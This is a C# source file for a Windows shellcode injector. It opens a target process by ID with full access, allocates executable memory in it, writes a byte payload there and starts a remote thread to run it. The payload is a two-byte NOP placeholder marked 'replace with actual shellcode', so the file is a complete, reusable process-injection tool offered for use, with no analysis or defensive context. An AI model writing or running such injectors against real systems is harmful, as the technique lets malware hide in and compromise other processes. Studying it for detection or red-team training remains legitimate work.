using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

class ShellcodeInjector
{
    [DllImport("kernel32.dll")]
    private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll")]
    private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    private static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr hObject);

    private const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
    private const uint MEM_COMMIT = 0x1000;
    private const uint MEM_RESERVE = 0x2000;
    private const uint PAGE_EXECUTE_READWRITE = 0x40;

    public static bool InjectShellcode(int processId, byte[] shellcode)
    {
        // Open the target process
        IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, processId);
        if (hProcess == IntPtr.Zero)
        {
            Console.WriteLine("[-] Failed to open process. Error: " + Marshal.GetLastWin32Error());
            return false;
        }

        // Allocate memory in the target process
        IntPtr remoteMemory = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (remoteMemory == IntPtr.Zero)
        {
            Console.WriteLine("[-] Failed to allocate memory in the target process. Error: " + Marshal.GetLastWin32Error());
            CloseHandle(hProcess);
            return false;
        }

        Console.WriteLine("[+] Allocated memory at: " + remoteMemory);

        // Write the shellcode to the allocated memory
        if (!WriteProcessMemory(hProcess, remoteMemory, shellcode, (uint)shellcode.Length, out _))
        {
            Console.WriteLine("[-] Failed to write shellcode to target process memory. Error: " + Marshal.GetLastWin32Error());
            CloseHandle(hProcess);
            return false;
        }

        Console.WriteLine("[+] Shellcode written to memory.");

        // Create a remote thread to execute the shellcode
        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, remoteMemory, IntPtr.Zero, 0, out _);
        if (hThread == IntPtr.Zero)
        {
            Console.WriteLine("[-] Failed to create remote thread. Error: " + Marshal.GetLastWin32Error());
            CloseHandle(hProcess);
            return false;
        }

        Console.WriteLine("[+] Remote thread created successfully.");

        // Clean up
        CloseHandle(hThread);
        CloseHandle(hProcess);

        return true;
    }

    static void Main(string[] args)
    {
        if (args.Length < 1)
        {
            Console.WriteLine("Usage: ShellcodeInjector <process_id>");
            return;
        }

        int processId;
        if (!int.TryParse(args[0], out processId))
        {
            Console.WriteLine("[-] Invalid process ID.");
            return;
        }

        // Example shellcode (MessageBox payload for demonstration purposes)
        byte[] shellcode = new byte[]
        {
            0x90, 0x90, // NOP NOP (Example placeholder, replace with actual shellcode)
            // Insert your shellcode here
        };

        if (InjectShellcode(processId, shellcode))
        {
            Console.WriteLine("[+] Shellcode injection succeeded.");
        }
        else
        {
            Console.WriteLine("[-] Shellcode injection failed.");
        }
    }
}
